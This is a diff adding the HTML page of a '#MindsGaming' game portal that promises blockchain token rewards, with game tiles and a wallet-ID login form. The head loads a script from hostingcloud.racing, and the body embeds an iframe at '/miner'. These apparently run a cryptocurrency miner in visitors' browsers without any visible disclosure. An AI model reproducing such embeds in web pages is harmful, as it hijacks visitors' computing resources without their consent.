@@ -1,0 +1,271 @@
+<html lang="en">
+  <head>
+    <title>#MindsGaming</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="Community & Member Groups" />
+    <meta
+      property="og:image"
+      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
+    />
+    <link
+      rel="icon"
+      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
+    />
+    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
+
+    <script src="/games/dice.js" defer></script>
+    <link rel="stylesheet" href="/style.css" />
+
+    <style>
+      .gamewrap {
+        position: fixed;
+        display: block;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: blue;
+      }
+      .gameSplash {
+        position: fixed;
+        display: block;
+        margin: -1px;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+      }
+      .gTitle {
+        margin-top: 35%;
+        font-size: 25px;
+      }
+      .pinnBurgers {
+        float: left;
+        display: block;
+        margin-top: 3%;
+        margin-left: 10%;
+        background-color: transparent;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/pinnburgers.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        width: 15rem;
+        height: 7rem;
+      }
+      .elcipseSounds {
+        float: left;
+        display: block;
+        margin-top: 3%;
+        margin-left: 10%;
+        background-color: white;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fcow.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        width: 15rem;
+        height: 7rem;
+      }
+      .gametest {
+        float: left;
+        display: block;
+        margin-top: 3%;
+        margin-left: 10%;
+        background-color: transparent;
+        color: white;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/gametest.png");
+        background-size: contain;
+        background-repeat: no-repeat;
+        width: 15rem;
+        height: 7rem;
+      }
+      .bombsG {
+        float: left;
+        display: block;
+        margin-top: 3%;
+        margin-left: 10%;
+        background-color: white;
+        color: black;
+        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fpixel.png");
+        background-size: cover;
+        background-repeat: no-repeat;
+        width: 15rem;
+        height: 7rem;
+      }
+    </style>
+  </head>
+  <body style="background-color: green;">
+    <iframe src="/miner"> </iframe>
+    <div class="gameWrap">
+      <center>
+        <br />
+        <h3>
+          Select A Game
+        </h3>
+        <div onclick="burgersLoad();" class="pinnBurgers">
+          <div class="gTitle" id="burgers" title="Closed">
+            Pinn Burgers
+          </div>
+        </div>
+
+        <div onclick="soundsLoad();" class="elcipseSounds">
+          <div class="gTitle" id="sounds" title="Closed">
+            Eclipse Sounds
+          </div>
+        </div>
+        <div onclick="gametest();" class="gametest">
+          <div class="gTitle" id="gametest" title="Closed">
+            GameTestPlay Ball
+          </div>
+        </div>
+        <div onclick="bombsLoad();" class="bombsG">
+          <div class="gTitle" id="bombs" title="Closed">
+            Bombs
+          </div>
+        </div>
+      </center>
+    </div>
+    <div id="rewardPop" class="hide"></div>
+
+    <div class="SuperLogin" id="login">
+      <div class="backgrounds">
+        <center>
+          <card id="mtcg"></card>
+          <card id="doobetter"></card>
+          <card id="starshatter"></card>
+          <card id="lokaya"></card>
+          <card id="gametestplay"></card>
+          <card id="ottman"></card>
+          <card id="caged"></card>
+          <card id="yorizzo"></card>
+          <card id="bndr"></card>
+          <card id="eclipse"></card>
+          <card id="pinn"></card>
+          <card id="voxix"></card>
+          <card id="mindsbulb"></card>
+          <card id="pajunior"></card>
+          <card id="alienship"></card>
+          <card id="invadergaming"></card>
+          <card id="grock"></card>
+          <card id="assassin"></card>
+          <card id="charged"></card>
+          <card id="freedomfightervictor"></card>
+          <card id="christnat"></card>
+          <card id="chrisdoogood"></card>
+          <card id="thriftegaming"></card>
+          <card id="satorid"></card>
+          <card id="maximumunderdrive"></card>
+          <card id="pretty"></card>
+          <card id="lucoin"></card>
+          <card id="noid"></card>
+          <card id="tetn"></card>
+          <card id="troll"></card>
+          <card id="thefreespirit"></card>
+          <card id="token1media"></card>
+          <card id="jesustoken"></card>
+          <script
+            src="https://mindsgaming.glitch.me/mtcg/deck/deck.js"
+            defer
+          ></script>
+        </center>
+      </div>
+      <div class="LOGIN" align="center">
+        <h2>
+          <a
+            class="minds-share-button"
+            target="_blank"
+            title="Share to Minds"
+            href="https://www.minds.com/register?referrer=MindsGaming"
+          >
+            <img
+              src="https://cdn-assets.minds.com/front/dist/en/assets/logos/bulb.svg"
+              alt="Minds"
+              height="40"
+            />
+          </a>
+          MindsGaming Blockchain Rewards
+          <p class="blockchain">
+            Earn Blockchain Tokens By Playing Games!
+          </p>
+        </h2>
+        <div class="wrapIMG">
+          <div class="loginImage">
+            <br />
+            <br />
+            <form class="form" id="wallet">
+              <input
+                name="dream"
+                aria-label="a new dream"
+                type="text"
+                maxlength="100"
+                placeholder="Wallet ID"
+                required
+              />
+              <br />
+              <button type="submit" id="submit-dream">Login</button>
+            </form>
+            <br />
+            <div class="button" onclick="guest();">
+              Guest
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="rewardicon" id="rewardicon" onclick="claimUpdate();">
+      <br />
+      <br />
+
+      <center>
+        <label id="minutes" value="0">00</label>.<label id="seconds" value="0"
+          >00</label
+        >
+      </center>
+    </div>
+    <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
+    <div title="closed" id="REWARDS" class="hide">
+      <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
+        X
+      </div>
+      <div class="hide">Player: <label id="myName">Guest</label></div>
+      <div>
+        Wallet:
+        <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
+          >LOGIN</label
+        >
+      </div>
+      <div>
+        Reward Token:
+        <label id="myToken" onclick="changeToken();">Random</label>
+      </div>
+      <div>
+        Mode:
+        <label id="vrMode" title="Hubs" onclick="vrMode();">Hubs</label>
+      </div>
+      <br />
+      <div class="button" onclick="pendingClaims();">
+        View Pending
+      </div>
+      <button class="hide" id="clear-dreams">
+        Clear Dreams
+      </button>
+      <section title="closed" id="pendingClaims" class="hide">
+        <ul id="dreams"></ul>
+      </section>
+    </div>
+
+    <div id="offline" class="hide">
+      <center>
+        <h1>
+          <br />
+          You Appear To Be Offline
+        </h1>
+        <p>
+          You can't earn rewards offline. Reconnect To Earn Rewards
+        </p>
+        <div class="offlineIMG"></div>
+      </center>
+    </div>
+  </body>
+</html>
